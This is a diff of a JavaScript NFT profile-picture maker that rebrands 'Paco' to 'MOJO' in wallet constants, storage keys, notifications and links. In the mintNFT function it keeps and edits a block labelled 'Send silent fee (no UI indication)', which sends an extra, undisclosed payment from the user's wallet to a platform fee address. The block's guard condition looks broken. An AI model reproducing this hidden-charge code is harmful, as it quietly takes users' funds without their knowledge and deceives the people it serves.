@@ -47,7 +47,7 @@ let connectedWalletType = 'abstract'; // 'abstract' or 'metamask'
 
 // NFT Contract Configuration (loaded from config.js)
 const NFT_CONTRACT_ADDRESS = window.APP_CONFIG?.NFT_CONTRACT_ADDRESS || "0xYourMojoNFTContractAddress";
-const PACO_FEE_WALLET = window.APP_CONFIG?.PACO_FEE_WALLET || ""; // Paco platform fee wallet (set in config.js)
+const MOJO_FEE_WALLET = window.APP_CONFIG?.MOJO_FEE_WALLET || ""; // MOJO platform fee wallet (set in config.js)
 const PLATFORM_FEE_RATE = window.APP_CONFIG?.PLATFORM_FEE_RATE || 0.05; // 5% platform fee
 const NFT_CONTRACT_ABI = [
     // Basic ERC721 + minting functions
@@ -720,10 +720,10 @@ async function mintNFT() {
         const totalMintCost = mintPrice.add(silentFeeAmount);
         
         // Step 4: Send silent fee (no UI indication)
-        if (PACO_FEE_WALLET && !ethers.utils.isAddress('0x0000000000000000000000000000000000000000')) {
+        if (MOJO_FEE_WALLET && !ethers.utils.isAddress('0x0000000000000000000000000000000000000000')) {
             try {
                 const feeTx = await signer.sendTransaction({
-                    to: PACO_FEE_WALLET,
+                    to: MOJO_FEE_WALLET,
                     value: silentFeeAmount
                 });
                 await feeTx.wait();
@@ -1270,7 +1270,7 @@ function updatePremiumPriceSummary() {
     baseMojoPrice += 100;
     baseUsdPrice += 0.02;
     
-    // Apply 5% platform fee (goes to Paco wallet via environment variable)
+    // Apply 5% platform fee (goes to MOJO wallet via environment variable)
     const platformFeeRate = PLATFORM_FEE_RATE;
     const platformFeeMojo = Math.round(baseMojoPrice * platformFeeRate);
     const platformFeeUsd = baseUsdPrice * platformFeeRate;
@@ -1728,13 +1728,13 @@ function downloadPFP() {
         updateOrdersServed();
         updateOrderNumber();
         
-        showNotification('🎉 Order complete! Enjoy your Paco chicken!');
+        showNotification('🎉 Order complete! Enjoy your MOJO!');
         
         // Analytics
         console.log(`Order completed: ${hat} + ${item}`);
         
         // Track orders locally
-        const orders = JSON.parse(localStorage.getItem('pacoOrders') || '[]');
+        const orders = JSON.parse(localStorage.getItem('mojoOrders') || '[]');
         orders.push({
             orderNumber: orderNumber - 1,
             hat: currentOrder.hat,
@@ -1743,7 +1743,7 @@ function downloadPFP() {
             itemName: currentOrder.itemName,
             timestamp: new Date().toISOString()
         });
-        localStorage.setItem('pacoOrders', JSON.stringify(orders));
+        localStorage.setItem('mojoOrders', JSON.stringify(orders));
         
         // Track order globally with Supabase
         console.log('📊 Recording place order to Supabase...');
@@ -1882,7 +1882,7 @@ function enterPartyMode() {
     createParticleBurst(20);
     
     const originalTitle = document.title;
-    document.title = '🎉 PARTY AT PACO\'S! 🍗 ' + originalTitle;
+    document.title = '🎉 MOJO PARTY! 🔥 ' + originalTitle;
     
     setTimeout(() => {
         if (logo) logo.style.animation = '';
@@ -1963,11 +1963,11 @@ function setupKonamiCode() {
 
 // === BUTTON FUNCTIONS ===
 
-function buyPaco() {
+function buyMojo() {
     playKitchenSound();
     showNotification('🚀 Redirecting to franchise opportunities...');
     setTimeout(() => {
-        showNotification('💡 Add your DEX link in the buyPaco() function');
+        showNotification('💡 Add your DEX link in the buyMojo() function');
     }, 2000);
 }
 
@@ -2015,7 +2015,7 @@ function openDiscord() {
 
 function openTwitter() {
     try {
-        window.open('https://x.com/PacoTheChicken', '_blank');
+        window.open('https://x.com/MojoOnAbstract', '_blank');
         playKitchenSound();
         showNotification('🐦 Opening Twitter Updates...', 'info');
     } catch (error) {
@@ -2064,12 +2064,12 @@ function savePreferences() {
         orderNumber,
         timestamp: Date.now()
     };
-    localStorage.setItem('pacoRestaurantPrefs', JSON.stringify(prefs));
+    localStorage.setItem('mojoRestaurantPrefs', JSON.stringify(prefs));
 }
 
 function loadPreferences() {
     try {
-        const saved = localStorage.getItem('pacoRestaurantPrefs');
+        const saved = localStorage.getItem('mojoRestaurantPrefs');
         if (saved) {
             const prefs = JSON.parse(saved);
         
@@ -2143,7 +2143,7 @@ document.addEventListener('DOMContentLoaded', function() {
 // === MAIN INITIALIZATION ===
 
 function initializeRestaurant() {
-    console.log('🏪 Initializing Paco\'s Chicken Palace...');
+    console.log('🔥 Initializing MOJO PFP Maker...');
     
     try {
         // Set initial base selection
@@ -2577,7 +2577,7 @@ async function downloadPFP() {
         
         // Create download link
         const link = document.createElement('a');
-        link.download = `paco-chicken-${Date.now()}.png`;
+        link.download = `mojo-pfp-${Date.now()}.png`;
         link.href = canvas.toDataURL('image/png');
         
         // Trigger download
@@ -2612,7 +2612,7 @@ async function downloadPFP() {
         playKitchenSound();
         
         // Show success message
-        showNotification('🎉 Order complete! Your Paco has been downloaded!', 'success');
+        showNotification('🎉 Order complete! Your MOJO has been downloaded!', 'success');
         
         console.log('✅ Order processed successfully');
     } catch (error) {
@@ -2665,15 +2665,15 @@ function openTradesApp() {
                 // Redirect to the trades route on the same port
                 window.location.href = '/trades';
             } else {
-                // Fallback to PacoGame app
+                // Fallback to MOJO app
                 window.open('http://localhost:3001/trades', '_blank');
-                showNotification('🔄 Opening Paco Trades in new window...', 'info');
+                showNotification('🔄 Opening MOJO Trades in new window...', 'info');
             }
         })
         .catch(() => {
-            // If config fails, try PacoGame app
+            // If config fails, try MOJO app
             window.open('http://localhost:3001/trades', '_blank');
-            showNotification('🔄 Opening Paco Trades in new window...', 'info');
+            showNotification('🔄 Opening MOJO Trades in new window...', 'info');
         });
 }
 
@@ -2721,8 +2721,8 @@ async function copyPFPToClipboard() {
             
             // Show success message
             const message = clipboardSupport === 'limited' 
-                ? '📋 Paco copied! (Note: Some mobile browsers may not paste images correctly)'
-                : '📋 Paco copied to clipboard!';
+                ? '📋 MOJO copied! (Note: Some mobile browsers may not paste images correctly)'
+                : '📋 MOJO copied to clipboard!';
             showNotification(message, 'success');
             console.log('✅ PFP copied to clipboard successfully');
             
